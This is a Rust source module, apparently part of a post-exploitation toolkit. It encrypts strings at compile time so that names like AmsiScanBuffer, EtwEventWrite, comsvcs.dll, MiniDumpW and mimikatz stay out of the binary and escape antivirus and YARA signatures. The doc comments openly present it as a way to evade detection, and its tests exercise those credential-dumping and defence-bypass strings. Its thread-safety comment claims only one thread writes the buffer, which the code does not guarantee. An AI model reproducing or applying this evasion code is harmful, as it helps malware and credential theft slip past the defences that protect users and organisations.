//! Compile-time string obfuscation to defeat static signature analysis.
//!
//! Sensitive strings (API names, DLL names, known IOC strings) are XOR-encrypted
//! at compile time using `const fn`. The plaintext NEVER appears in the compiled
//! binary's `.rdata` section — only ciphertext + a single-byte XOR key.
//!
//! # Usage
//! ```ignore
//! use litterbox::xstr;
//!
//! let amsi = xstr!("AmsiScanBuffer");
//! let dll  = xstr!("comsvcs.dll");
//!
//! let handle = LoadLibraryA(s!(dll.as_str()));
//! ```
//!
//! # Security Note
//! This stops **static** signature detection. A runtime memory scanner
//! could still read the decrypted string after first access, but by then
//! the API has already been resolved and the decrypted buffer can be
//! immediately zeroed.

use core::cell::UnsafeCell;
use core::sync::atomic::{AtomicBool, Ordering};

/// # Safety
/// Thread safety is guaranteed by the `AtomicBool` done flag:
/// - Only one thread ever writes to `decrypted` (the first to set `done`).
/// - All subsequent readers observe the fully written buffer via the
///   Release/Acquire ordering on the `done` flag.
unsafe impl<const N: usize> Sync for XorString<N> {}

// ── XOR key ─────────────────────────────────────────────────────────
// A single arbitrary byte. Changed periodically to defeat hash-based YARA.
// This is NOT secret — it only needs to be unpredictable enough to break
// the plaintext string signatures in the binary's .rdata.
const XOR_KEY: u8 = 0x9C;

/// Encrypt `input` byte-for-byte with `XOR_KEY` at compile time.
pub const fn xor_encrypt<const N: usize>(input: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = input[i] ^ XOR_KEY;
        i += 1;
    }
    out
}

/// A string encrypted at compile time and decrypted on first access.
///
/// The plaintext is **not** stored in the binary. Only the ciphertext
/// and XOR key appear. Decryption happens once, lazily, on the first
/// call to `as_str()` or `as_bytes()`.
pub struct XorString<const N: usize> {
    ciphertext: [u8; N],
    decrypted: UnsafeCell<[u8; N]>,
    done: AtomicBool,
}

impl<const N: usize> XorString<N> {
    /// Create from a compile-time XorString literal (via `xor!` macro).
    pub const fn new(ciphertext: [u8; N]) -> Self {
        Self {
            ciphertext,
            decrypted: UnsafeCell::new([0u8; N]),
            done: AtomicBool::new(false),
        }
    }

    /// Return decrypted bytes, decrypting lazily on first access.
    pub fn as_bytes(&self) -> &[u8] {
        if !self.done.load(Ordering::Relaxed) {
            let decrypted = self.decrypted.get() as *mut u8;
            let cipher = &self.ciphertext as *const u8;
            let mut i = 0;
            while i < N {
                // Safety: no data race — `done` flag serialises access.
                // `ciphertext` is immutable, `decrypted` is only written
                // once before `done` is set to true.
                let b = unsafe { *cipher.add(i) } ^ XOR_KEY;
                unsafe {
                    *decrypted.add(i) = b;
                }
                i += 1;
            }
            self.done.store(true, Ordering::Release);
        }
        // Safety: `decrypted` is fully initialized after `done` is true.
        unsafe { core::slice::from_raw_parts(self.decrypted.get() as *const u8, N) }
    }

    /// Return decrypted string (null-terminated aware).
    pub fn as_str(&self) -> &str {
        let bytes = self.as_bytes();
        let end = bytes.iter().position(|b| *b == 0).unwrap_or(bytes.len());
        unsafe { core::str::from_utf8_unchecked(&bytes[..end]) }
    }
}

/// Macro: create an `XorString` from a string literal.
///
/// The string is encrypted at **compile time**. The ciphertext + key
/// are embedded in the binary; the plaintext is **never** stored.
#[macro_export]
macro_rules! xstr {
    ($s:expr) => {{
        const N: usize = concat!($s, "\0").len();
        const INPUT_BYTES: &[u8; N] = {
            const S: &[u8] = concat!($s, "\0").as_bytes();
            // Safety: concat! with known input always produces exactly N bytes.
            // This is a compile-time const, so any mismatch is a compile error.
            unsafe { &*(S.as_ptr() as *const [u8; N]) }
        };
        const CIPHER: [u8; N] = $crate::postex::litterbox::xor_encrypt(INPUT_BYTES);
        $crate::postex::litterbox::XorString::<N>::new(CIPHER)
    }};
}

/// Convenience: get a `&'static str` from an inline xstr! call.
///
/// The `XorString` lives in a `static` so the returned `&str`
/// outlives the expression scope.
#[macro_export]
macro_rules! xs {
    ($s:expr) => {{
        const N: usize = concat!($s, "\0").len();
        const INPUT_BYTES: &[u8; N] = {
            const S: &[u8] = concat!($s, "\0").as_bytes();
            // Safety: concat! with known input always produces exactly N bytes.
            // This is a compile-time const, so any mismatch is a compile error.
            unsafe { &*(S.as_ptr() as *const [u8; N]) }
        };
        const CIPHER: [u8; N] = $crate::postex::litterbox::xor_encrypt(INPUT_BYTES);
        static STORAGE: $crate::postex::litterbox::XorString<N> =
            $crate::postex::litterbox::XorString::<N>::new(CIPHER);
        STORAGE.as_str()
    }};
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_roundtrip_hello() {
        let s = xstr!("Hello");
        assert_eq!(s.as_str(), "Hello");
    }

    #[test]
    fn test_roundtrip_amsi() {
        let s = xstr!("AmsiScanBuffer");
        assert_eq!(s.as_str(), "AmsiScanBuffer");
    }

    #[test]
    fn test_roundtrip_empty() {
        let s = xstr!("");
        assert_eq!(s.as_str(), "");
    }

    #[test]
    fn test_roundtrip_mimikatz() {
        let s = xstr!("mimikatz");
        assert_eq!(s.as_str(), "mimikatz");
    }

    #[test]
    fn test_roundtrip_dll() {
        let s = xstr!("comsvcs.dll");
        assert_eq!(s.as_str(), "comsvcs.dll");
    }

    #[test]
    fn test_roundtrip_special_chars() {
        let s = xstr!("NtOpenProcess");
        assert_eq!(s.as_str(), "NtOpenProcess");
    }

    #[test]
    fn test_decrypted_does_not_equal_input_raw() {
        const INPUT_BYTES: &[u8; 7] = {
            const S: &[u8] = b"secret\0";
            unsafe { &*(S.as_ptr() as *const [u8; 7]) }
        };
        const N: usize = 7;
        const CIPHER: [u8; N] = xor_encrypt(INPUT_BYTES);
        // Ciphertext should differ from plaintext
        assert_ne!(&CIPHER[..], &b"secret\0"[..]);
    }

    #[test]
    fn test_xs_macro() {
        assert_eq!(xs!("EtwEventWrite"), "EtwEventWrite");
    }

    #[test]
    fn test_as_bytes_length() {
        let s = xstr!("MiniDumpW");
        assert_eq!(s.as_bytes().len(), 10); // including null
    }

    #[test]
    fn test_repeated_access() {
        let s = xstr!("NtQuerySystemInformation");
        assert_eq!(s.as_str(), "NtQuerySystemInformation");
        // Second access should return same result
        assert_eq!(s.as_str(), "NtQuerySystemInformation");
    }
}
